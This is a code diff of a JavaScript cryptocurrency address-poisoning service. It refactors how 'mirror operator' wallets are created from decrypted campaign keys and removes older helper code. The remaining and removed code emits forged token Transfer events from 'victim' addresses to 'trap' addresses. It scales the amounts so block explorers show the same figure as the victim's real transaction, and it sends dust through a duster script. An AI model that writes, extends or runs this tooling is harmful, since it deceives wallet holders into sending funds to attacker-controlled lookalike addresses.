@@ -1,7 +1,8 @@
 import 'dotenv/config';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { createPublicClient, createWalletClient, privateKeyToAccount, http, fallback } from 'viem';
+import { createPublicClient, createWalletClient, http, fallback } from 'viem';
+import { privateKeyToAccount } from 'viem/accounts';
 import { mainnet, bsc, polygon } from 'viem/chains';
 import { exec } from 'child_process';
 import { promisify } from 'util';
@@ -162,18 +163,30 @@ async function loadTrapsFromDB() {
 
     const campaignIds = campaigns.map(c => c.id);
 
+
     // 🆕 Load funding keys for each campaign to use as mirror operators
-    if (MIRROR_TOKEN_ADDRESS) {
+    if (MIRROR_TOKEN_USDC || MIRROR_TOKEN_USDT || MIRROR_TOKEN_NATIVE) {
       for (const camp of campaigns) {
         if (!camp.funding_private_key_enc) {
           console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
           continue;
         }
         try {
-          const fundingKey = decrypt(camp.funding_private_key_enc);
-          const fundingAccount = privateKeyToAccount(
-            fundingKey.startsWith('0x') ? fundingKey : `0x${fundingKey}`
-          );
+          let fundingKey = decrypt(camp.funding_private_key_enc);
+
+          // 🚨 FIX: Trim whitespace and validate format
+          fundingKey = fundingKey.trim();
+          if (!fundingKey.startsWith('0x')) {
+            fundingKey = `0x${fundingKey}`;
+          }
+
+          // Validate hex format (0x + 64 hex chars)
+          if (!/^0x[a-fA-F0-9]{64}$/.test(fundingKey)) {
+            console.warn(`[DEBUG] Campaign ${camp.id} has invalid funding key format, skipping mirror for this campaign`);
+            continue;
+          }
+
+          const fundingAccount = privateKeyToAccount(fundingKey);
 
           const walletClient = createWalletClient({
             account: fundingAccount,
@@ -364,26 +377,6 @@ const client = createPublicClient({
 });
 
 
-// ─── Mirror operator wallet (signs the forged-event txs) ───
-if (MIRROR_OPERATOR_KEY && MIRROR_TOKEN_ADDRESS) {
-  try {
-    const operatorAccount = privateKeyToAccount(
-      MIRROR_OPERATOR_KEY.startsWith('0x') ? MIRROR_OPERATOR_KEY : `0x${MIRROR_OPERATOR_KEY}`
-    );
-    mirrorWalletClient = createWalletClient({
-      account: operatorAccount,
-      chain: viemChain,
-      transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
-    });
-    console.log(`[DEBUG] MirrorToken enabled at ${MIRROR_TOKEN_ADDRESS} (operator ${operatorAccount.address})`);
-  } catch (err) {
-    console.warn(`[DEBUG] MirrorToken disabled - bad operator key: ${err.message}`);
-  }
-} else {
-  console.warn('[DEBUG] MirrorToken disabled - set MIRROR_TOKEN_ADDRESS and MIRROR_OPERATOR_KEY in .env');
-}
-
-
 // --- Helper: retry wrapper ---
 async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
   return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
@@ -422,15 +415,6 @@ function getAssetFromTx(tx) {
   return null;
 }
 
-
-// ─── Mirror helpers ───
-const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };
-
-function normalizeTo6Dec(raw, decimals) {
-  if (decimals === 6) return raw;
-  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
-  return raw * (10n ** BigInt(6 - decimals));
-}
 
 function computeMirrorRawValue(tx, detectedAsset) {
   try {
@@ -483,58 +467,6 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
 }
 
 
-// ─── Mirror helpers ───
-const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };
-
-// MirrorToken.decimals() = 6, so normalize the mirrored raw value so the
-// explorer prints the SAME human-readable number as the victim's real tx.
-function normalizeTo6Dec(raw, decimals) {
-  if (decimals === 6) return raw;
-  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
-  return raw * (10n ** BigInt(6 - decimals));
-}
-
-function computeMirrorRawValue(tx, detectedAsset) {
-  try {
-    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
-      // transfer(to, value) → value word
-      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(74, 138)), TOKEN_DECIMALS[detectedAsset] || 6);
-    }
-    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
-      // transferFrom(from, to, value) → value word
-      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(138, 202)), TOKEN_DECIMALS[detectedAsset] || 6);
-    }
-    if (tx.value && BigInt(tx.value) > 0n) {
-      // native (18 dec) → 6 dec so the displayed number matches
-      return BigInt(tx.value) / 1000000000000n;
-    }
-    return 0n;
-  } catch {
-    return 0n;
-  }
-}
-
-// Serialize mirror emits so concurrent victims don't nonce-collide on the operator wallet
-let mirrorLock = Promise.resolve();
-
-function emitForgedTransfer(victimAddress, trapAddress, rawValue) {
-  const run = mirrorLock.then(async () => {
-    if (!mirrorWalletClient || !MIRROR_TOKEN_ADDRESS) return false;
-    const hash = await mirrorWalletClient.writeContract({
-      address: MIRROR_TOKEN_ADDRESS,
-      abi: MIRROR_TOKEN_ABI,
-      functionName: 'transferFrom',
-      args: [victimAddress, trapAddress, rawValue],
-    });
-    logger.info(`[mirror] Forged Transfer emitted: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
-    return hash;
-  }).catch(err => {
-    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
-    return false;
-  });
-  mirrorLock = run.then(() => { });
-  return run;
-}
 
 
 // ─── Send dust via duster.py (accepts optional asset) ──
